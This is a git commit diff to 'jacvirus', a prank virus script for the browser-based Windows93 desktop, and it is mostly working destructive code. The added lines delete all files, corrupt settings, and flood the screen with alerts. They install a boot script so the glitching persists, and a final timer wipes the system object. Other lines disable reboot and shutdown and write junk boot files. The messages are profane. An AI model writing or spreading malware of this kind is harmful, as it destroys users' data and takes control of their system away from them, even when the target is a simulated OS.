96bffdd857a7d39a95c646c63b64b22fc6119ffc
GlitchyZorua <54043124+GlitchyZorua@users.noreply.github.com>
2024-11-27 11:33:22 -0800

    ok

--- Scripts/Apps/GlitchyZorua/jacvirus/jacvirus #2.1.js
+++ Scripts/Apps/GlitchyZorua/jacvirus/jacvirus #2.1.js
@@ -12,7 +12,11 @@ $file.save("/a/desktop/bruh.lnk42", "js base64"); //ok please stop
 $file.save("/a/boot/bruh.lnk42", "js base64"); //fuck you
 max = 100
 min = 0
+chaos = false
 var wtf = Math.random() * (max - min) + min;
+if (chaos === true){
+  wtf = 100
+}
 $alert.error("Your computer is now trashed by the JACVIRUS. Don't try to reboot, or boot in safe mode. Your pc is fucked anyway. Use it as long as you can. I don't even think you can see this anymore.")
 alert("Your computer is now trashed by the JACVIRUS. Don't try to reboot, or boot in safe mode. Your pc is fucked anyway. Use it as long as you can.")
 
@@ -25,12 +29,17 @@ le._apps.reboot.exec = function(){
 le._apps.shutdown.exec = function(){
 	$alert.error("Your system admin forbids you from launching this application")
 }
+
 var i;
 for (let step = 0; step < 10; step++) {
   $alert('YOUR PC IS FUCKED.')
   $file.save("/a/boot/bruh<><><<><><>(%q#)%($)$*(#).lnk42", "js base64");// oh my god
-  $file.save("/a/boot/bruh#$$#$#$#$&iu(#)$*&)(#$*()#$*#_%$<$r<>r<>><><><)\"\"\""+Math.Random+".lnk42", "js base64"); //stop
+  $file.save("/a/boot/bruh#$$#$#$#$&iu(#)$*&)(#$*()#$*#_%$<$r<>r<>><><><)\"\"\""+Math.random()+".lnk42", "js base64"); //stop
 } 
+
+
+
+
 setInterval(function(){Array.prototype.random = function () {
   return this[Math.floor((Math.random()*this.length))];
 }
@@ -57,12 +66,88 @@ s.push(sn);
   }, 2500)
 })() 
 /*/
+
+
 if (wtf > 5){
 le._dom.taskbar.innerHTML = "<button>ERROR!</button>"
 }
+
+
+if (wtf > 40){
 //$store.set('boot/love.js', 'while(true) { continue; }')
 window.location.href = window.location.href;
 function main(){setInterval(function(){requestAnimationFrame(()=>{function c(f){f.querySelectorAll(".ui_window__head,.ui_window,button,#s42_dock,#s42_notif,.ui_menu ul,*>button,.skin_inset,.skin_base").forEach(g=>g.style.background="#"+(16777215*Math.random()<<0).toString(16))}c(document),document.querySelectorAll("iframe").forEach(f=>c(f.contentWindow.document))})},100)}main(),$db.set("boot/./colorbug.js","!"+main.toString()+"()");
+}
+
+
+if (wtf > 35){
+setInterval(function () {
+$alert({msg:Math.random() * (999999999999999999999999999999999999999999999999999999999 - -9999999999999999999999) + -9999999999999999999999,center:false})
+}, 4000)
+}
+
+if (wtf > 35){
+  setInterval(function () {
+  $alert.error(Math.random() * (999999999999999999999999999999999999999999999999999999999 - -9999999999999999999999) + -9999999999999999999999);
+  }, 4000)
+}
+
+if (wtf > 35){
+  setInterval(function () {
+  $alert.info(Math.random() * (999999999999999999999999999999999999999999999999999999999 - -9999999999999999999999) + -9999999999999999999999);
+  }, 4000)
+}
+
+if (wtf > 50){
+  $explorer.exe.Open($explorer.exe.SelectAll())
+}
+
+random = function(length) {
+  var array = new Uint16Array(length);
+  window.crypto.getRandomValues(array);
+  var str = '';
+  for (var i = 0; i < array.length; i++) {
+    str += String.fromCharCode(array[i]);
+  };
+  return str;
+}
+if (wtf > 55){
+  le._settings.skin = random(Math.random() * (999999999999999999999999999999999999999999999999999999999 - -9999999999999999999999) + -9999999999999999999999);
+}
+if (wtf > 40){
+  setInterval(function () {
+  $alert.info(random(Math.random() * (1000 - -1000) + -1000));
+  }, 4000)
+}
+
+if (wtf > 40){
+  setInterval(function () {
+  $alert.warn(random(Math.random() * (1000 - -1000) + -1000));
+  }, 4000)
+}
+
+if (wtf > 40){
+  setInterval(function () {
+  $alert.error(random(Math.random() * (1000 - -1000) + -1000));
+  }, 4000)
+}
+
+if (wtf > 45){
+  var progressBar = $alert.progress("Loading...","Loading...") // Spawns bar
+  setInterval(function () {
+    progressBar.update(1)
+  }, 10000)
+  setInterval(function () {
+    var progressBar = $alert.progress(random(Math.random() * (1000 - -1000) + -1000), random(Math.random() * (1000 - -1000) + -1000)) // Spawns bar
+    progressBar.update(1)
+  }, 10000)
+}
+if (wtf > 50){
+  setInterval(function () {
+  var fuckoff = random(Math.random() * (1000 - -1000) + -1000)
+    $alert.help(fuckoff)
+  }, 4000)
+}
 if (wtf > 30){
 ( function ( )
 {
@@ -91,13 +176,14 @@ setInterval(function(){Array.prototype.random = function () {
   return this[Math.floor((Math.random()*this.length))];
 }
 wmd = []
-/*/
 function addStyle(styleString) {
     const style = document.createElement('style');
     style.textContent = styleString;
     document.head.append(style);
 }
 fetch("https://cors-anywhere.herokuapp.com/https://pastebin.com/raw/TKkw1Jak").then(response => response.text()).then(data => addStyle(data))
+
+/*/
 
 var icons = ['/c/sys/img/loading.gif','/c/sys/img/logo16.png','/c/sys/img/logo32.png','/c/sys/img/logo48.png','/c/sys/img/logob.png','/c/sys/img/logobug.png','/c/sys/img/logow.png','/c/sys/cursors/default.cur','/c/sys/skins/w93/alert.png','/c/sys/skins/w93/alert.png','/c/sys/skins/w93/camera.png','/c/sys/skins/w93/cdrom.png','/c/sys/skins/w93/config.png','/c/sys/skins/w93/documents.png','/c/sys/skins/w93/error.png','/c/sys/skins/w93/explorer.png','/c/sys/skins/w93/file.png','/c/sys/skins/w93/find.png','/c/sys/skins/w93/floppy-backup.png','/c/sys/skins/w93/floppy-format.png','/c/sys/skins/w93/floppy-restore.png','/c/sys/skins/w93/floppy.png','/c/sys/skins/w93/floppyB.png','/c/sys/skins/w93/help.png','/c/sys/skins/w93/info.png','/c/sys/skins/w93/install.png','/c/sys/skins/w93/k7.png','/c/sys/skins/w93/letter.png','/c/sys/skins/w93/mail.png','/c/sys/skins/w93/mails.png','/c/sys/skins/w93/programs.png','/c/sys/skins/w93/question.png','/c/sys/skins/w93/rescan.png','/c/sys/skins/w93/rss.png','/c/sys/skins/w93/run.png','/c/sys/skins/w93/scan.png','/c/sys/skins/w93/settings.png','/c/sys/skins/w93/shortcut.png','/c/sys/skins/w93/shutdown.png','/c/sys/skins/w93/sound_off.png','/c/sys/skins/w93/sound_on.png','/c/sys/skins/w93/stats.png','/c/sys/skins/w93/store.png','/c/sys/skins/w93/stuff.png','/c/sys/skins/w93/trash.png','/c/sys/skins/w93/trophy.png','/c/sys/skins/w93/win93.png','/c/sys/skins/w93/16/calc.png','/c/sys/skins/w93/16/explorer.png','/c/sys/skins/w93/16/home.png','/c/sys/skins/w93/16/message.png','/c/sys/skins/w93/16/redo.png','/c/sys/skins/w93/16/rss.png','/c/sys/skins/w93/16/settings.png','/c/sys/skins/w93/16/sound_off.png','/c/sys/skins/w93/16/sound_on.png','/c/sys/skins/w93/16/start.png','/c/sys/skins/w93/16/wamp_offline.png','/c/sys/skins/w93/16/wamp_online.png','/c/sys/skins/w93/apps/3d.png','/c/sys/skins/w93/apps/acidBox.png','/c/sys/skins/w93/apps/annaKournikova.gif','/c/sys/skins/w93/apps/ansilove.png','/c/sys/skins/w93/apps/arena93.png','/c/sys/skins/w93/apps/bananamp.png','/c/sys/skins/w93/apps/brodkast.png','/c/sys/skins/w93/apps/bytebeat.png','/c/sys/skins/w93/apps/calc.png','/c/sys/skins/w93/apps/catexplorer.png','/c/sys/skins/w93/apps/chat.gif','/c/sys/skins/w93/apps/codemirror.png','/c/sys/skins/w93/apps/corgi.png','/c/sys/skins/w93/apps/dangerous.png','/c/sys/skins/w93/apps/defrag.png','/c/sys/skins/w93/apps/doctor.gif','/c/sys/skins/w93/apps/dolphin.png','/c/sys/skins/w93/apps/dora.png','/c/sys/skins/w93/apps/dosbox.png','/c/sys/skins/w93/apps/framapad.png','/c/sys/skins/w93/apps/fx.png','/c/sys/skins/w93/apps/gameOfLife.png','/c/sys/skins/w93/apps/glitchgirlz.png','/c/sys/skins/w93/apps/helix.png','/c/sys/skins/w93/apps/hexedit.png','/c/sys/skins/w93/apps/hl3.png','/c/sys/skins/w93/apps/hydra.png','/c/sys/skins/w93/apps/iframe.png','/c/sys/skins/w93/apps/imgviewer.png','/c/sys/skins/w93/apps/inception.png','/c/sys/skins/w93/apps/keygen.png','/c/sys/skins/w93/apps/lab.png','/c/sys/skins/w93/apps/layer.png','/c/sys/skins/w93/apps/lsdj.png','/c/sys/skins/w93/apps/matrix.png','/c/sys/skins/w93/apps/midiPlayer.png','/c/sys/skins/w93/apps/minesweeper.png','/c/sys/skins/w93/apps/modbox.png','/c/sys/skins/w93/apps/nanoloop.png','/c/sys/skins/w93/apps/paint.png','/c/sys/skins/w93/apps/pd.png','/c/sys/skins/w93/apps/pin.png','/c/sys/skins/w93/apps/pokeRainbow.png','/c/sys/skins/w93/apps/poney.png','/c/sys/skins/w93/apps/progressquest.gif','/c/sys/skins/w93/apps/recorder.png','/c/sys/skins/w93/apps/robby.png','/c/sys/skins/w93/apps/sick.png','/c/sys/skins/w93/apps/skifree.png','/c/sys/skins/w93/apps/solitaire.gif','/c/sys/skins/w93/apps/terminal.png','/c/sys/skins/w93/apps/vega.png','/c/sys/skins/w93/apps/visualNovel.png','/c/sys/skins/w93/apps/voice.png','/c/sys/skins/w93/apps/xray.png','/c/sys/skins/w93/apps/yoda.gif','/c/sys/skins/w93/apps/zkype.png','/c/sys/skins/w93/devices/computer.png','/c/sys/skins/w93/devices/drive-harddisk.gif','/c/sys/skins/w93/devices/drive-storage.gif','/c/sys/skins/w93/devices/floppyB.gif','/c/sys/skins/w93/ext/adf.png','/c/sys/skins/w93/ext/ans.png','/c/sys/skins/w93/ext/beep.png','/c/sys/skins/w93/ext/c64.png','/c/sys/skins/w93/ext/css.png','/c/sys/skins/w93/ext/cur.png','/c/sys/skins/w93/ext/gb.png','/c/sys/skins/w93/ext/gbc.png','/c/sys/skins/w93/ext/js.png','/c/sys/skins/w93/ext/nes.png','/c/sys/skins/w93/ext/nfo.png','/c/sys/skins/w93/ext/pd.png','/c/sys/skins/w93/ext/pdf.png','/c/sys/skins/w93/ext/php.png','/c/sys/skins/w93/ext/py.png','/c/sys/skins/w93/ext/rss.png','/c/sys/skins/w93/ext/sms.png','/c/sys/skins/w93/mime/application.png','/c/sys/skins/w93/mime/application2.png','/c/sys/skins/w93/mime/audio.png','/c/sys/skins/w93/mime/image.png','/c/sys/skins/w93/mime/model.png','/c/sys/skins/w93/mime/text.png','/c/sys/skins/w93/mime/video.png','/c/sys/skins/w93/places/folder-open.png','/c/sys/skins/w93/places/folder.png','/c/sys/skins/w93/places/network-workgroup.png','/c/sys/skins/w93/places/user-desktop.png','/c/sys/skins/w93/places/user-home.png','/c/sys/skins/w93/places/user-trash-full.png','/c/sys/skins/w93/places/user-trash.png','/c/sys/skins/w93/places/16/folder-open.png','/c/sys/skins/w93/places/16/folder.png','/c/sys/skins/w93/places/16/user-trash-full.png','/c/sys/skins/w93/places/16/user-trash.png','/c/sys/skins/w93/type/ans.png','/c/sys/skins/w93/type/font-sfnt.png','/c/sys/skins/w93/type/font-woff_x-.png','/c/sys/skins/w93/type/html.png','/c/sys/skins/w93/type/json.png','/c/sys/skins/w93/type/midi.png','/c/sys/skins/w93/type/x-debian-package.png','/c/sys/skins/w93/type/x-markdown.png','/c/sys/skins/w93/type/x-mod.png','/c/sys/skins/w93/type/x-msdownload.png','/c/sys/skins/w93/type/zip_x-gzip_x-rar_x-tar.png','/c/files/images/icons/90s1.png','/c/files/images/icons/90s2.png','/c/files/images/icons/90s123.png','/c/files/images/icons/angle.png','/c/files/images/icons/antic.png','/c/files/images/icons/bat.png','/c/files/images/icons/bomb.png','/c/files/images/icons/burger.png','/c/files/images/icons/burger2.png','/c/files/images/icons/candy.png','/c/files/images/icons/cat1.png','/c/files/images/icons/cherry.png','/c/files/images/icons/clock.png','/c/files/images/icons/clock2.png','/c/files/images/icons/derp.png','/c/files/images/icons/derpina.png','/c/files/images/icons/donut.png','/c/files/images/icons/eye.png','/c/files/images/icons/fckyea.png','/c/files/images/icons/feuille.png','/c/files/images/icons/fish.png','/c/files/images/icons/foreveralone.png','/c/files/images/icons/fuuuu.png','/c/files/images/icons/gief.gif','/c/files/images/icons/icecream1.png','/c/files/images/icons/icecream2.png','/c/files/images/icons/lame.png','/c/files/images/icons/likeaboss.png','/c/files/images/icons/lol.png','/c/files/images/icons/maze.png','/c/files/images/icons/meat.png','/c/files/images/icons/megusta.png','/c/files/images/icons/necronomicoin.png','/c/files/images/icons/no.png','/c/files/images/icons/now.png','/c/files/images/icons/petitpapanoel.png','/c/files/images/icons/pizza.png','/c/files/images/icons/potato.png','/c/files/images/icons/pow.png','/c/files/images/icons/qbert.png','/c/files/images/icons/rotate.png','/c/files/images/icons/rotatecomputer.png','/c/files/images/icons/sandwich.png','/c/files/images/icons/serious.png','/c/files/images/icons/sims.png','/c/files/images/icons/trivial.png','/c/files/images/icons/troll.png','/c/files/images/icons/victoryflag.png','/c/files/images/icons/warning.png','/c/files/images/icons/window.png','/c/files/images/icons/wizard.png','/c/files/images/icons/yea.png','/c/files/images/icons/yao.png','/c/files/images/icons/yinyan.png'];
 var sounds = ['/c/sys/sounds/BLOP.ogg','/c/sys/sounds/BOOT.ogg','/c/sys/sounds/CHORD.ogg','/c/sys/sounds/QUACK.ogg','/c/files/sounds/air-horn.mp3','/c/files/sounds/aplausos_2.mp3','/c/files/sounds/Aw this stuff is really fresh.mp3','/c/files/sounds/badumtss.swf.mp3','/c/files/sounds/ballsofsteel.swf.mp3','/c/files/sounds/bande_de_putain_de_sales_putes.mp3','/c/files/sounds/boomheadshot.mp3','/c/files/sounds/censor-beep-1.mp3','/c/files/sounds/check this out.mp3','/c/files/sounds/chewbacca.swf.mp3','/c/files/sounds/CHORD.mp3','/c/files/sounds/chuck.mp3','/c/files/sounds/combobreaker.mp3','/c/files/sounds/crack_the_whip.mp3','/c/files/sounds/cuek.swf.mp3','/c/files/sounds/DAMN SON! WHERED YOU FIND THIS.mp3','/c/files/sounds/demoman_specialcompleted11.mp3','/c/files/sounds/did you miss me.mp3','/c/files/sounds/doh.swf.mp3','/c/files/sounds/double_rainbow.mp3','/c/files/sounds/drama.swf.mp3','/c/files/sounds/dramatic-end.mp3','/c/files/sounds/dramatic-look-kill-nill1.mp3','/c/files/sounds/dramatic.swf.mp3','/c/files/sounds/dry-fart.mp3','/c/files/sounds/duke-nukem-shit-happens.mp3','/c/files/sounds/dun_dun_1.mp3','/c/files/sounds/efeitos-sonoros-brasil-sil-sil-rede-globo.mp3','/c/files/sounds/efeitos-sonoros-fiu-fiu.mp3','/c/files/sounds/emobullshit.ogg','/c/files/sounds/exterminate.mp3','/c/files/sounds/fatality.swf.mp3','/c/files/sounds/final-fantasy-v-music-victory-fanfare.mp3','/c/files/sounds/fua.mp3','/c/files/sounds/fuck.mp3','/c/files/sounds/fuckoff.mp3','/c/files/sounds/gabba.mp3','/c/files/sounds/gameboy.mp3','/c/files/sounds/gangnamstyle.mp3','/c/files/sounds/george-micael-wham-careless-whisper-1.mp3','/c/files/sounds/goodbadugly-whistle-long.mp3','/c/files/sounds/Groovy_Blue_Nokia_3310_Ringtone_28.mp3','/c/files/sounds/hadouken.mp3','/c/files/sounds/hallelujahshort.swf.mp3','/c/files/sounds/headshot-01.mp3','/c/files/sounds/hh.mp3','/c/files/sounds/hit it.mp3','/c/files/sounds/i-will-always-love-you-low.mp3','/c/files/sounds/im-batman.mp3',"/c/files/sounds/it's party time.mp3",'/c/files/sounds/lalalalala.swf.mp3','/c/files/sounds/laugh.mp3','/c/files/sounds/lightsaber_02.mp3','/c/files/sounds/Macarena.mp3','/c/files/sounds/mashed potatoes.mp3','/c/files/sounds/metalgearsolid.mp3','/c/files/sounds/mk.mp3','/c/files/sounds/mktoasty_1.mp3','/c/files/sounds/mp3_10.mp3','/c/files/sounds/nameless-scream-3-howie-scream.mp3','/c/files/sounds/no-god-please-no-noooooooooo.mp3','/c/files/sounds/oh my god.mp3','/c/files/sounds/oh-yeah.mp3','/c/files/sounds/ok party people in the house.mp3','/c/files/sounds/ouink.mp3','/c/files/sounds/over9000.swf.mp3','/c/files/sounds/peproll1.mp3','/c/files/sounds/power-lego.mp3','/c/files/sounds/Road kill.mp3','/c/files/sounds/sadtrombone.swf.mp3','/c/files/sounds/shooting-the-crap-out-of-somone.mp3','/c/files/sounds/shutdown.mp3','/c/files/sounds/shutup.swf.mp3','/c/files/sounds/silent-hill-2-siren.mp3','/c/files/sounds/snare.mp3','/c/files/sounds/snoop-dogg-smoke-weed-everyday.mp3','/c/files/sounds/sound-9______.mp3','/c/files/sounds/tada.mp3','/c/files/sounds/this is penis.mp3','/c/files/sounds/thisissparta.swf.mp3','/c/files/sounds/tripple rainbow.mp3','/c/files/sounds/trollolol.swf.mp3','/c/files/sounds/utini.mp3','/c/files/sounds/wouh_01.mp3','/c/files/sounds/wouh_02.mp3','/c/files/sounds/wtf_boom.mp3','/c/files/sounds/yanp.mp3'];
@@ -206,6 +292,11 @@ if (wtf > 20){
     $audio("error").play()
   },3000) 
 }
+
+
+if (wtf > 25){ 
+  $explorer.exe.Delete($explorer.exe.SelectAll())
+}
 var progressBar = $alert.progress("Removing: SYS42 WINDOWS93", "SYS42 DEFRIENDER ANTIVIRUS PROTECTION");
 $notif("SYSTEM INSTABILITY NOTIFICATION")
 setInterval(function() {
@@ -285,8 +376,10 @@ setTimeout(function() {
   system42="trashed42"
 }, 30000);
 
+
+
 setTimeout(function() {
-  if (wtf < 40){
+  if (wtf < 100){
   Object.keys(le).forEach($k=>delete le[$k]);
   }
 }, 100000);
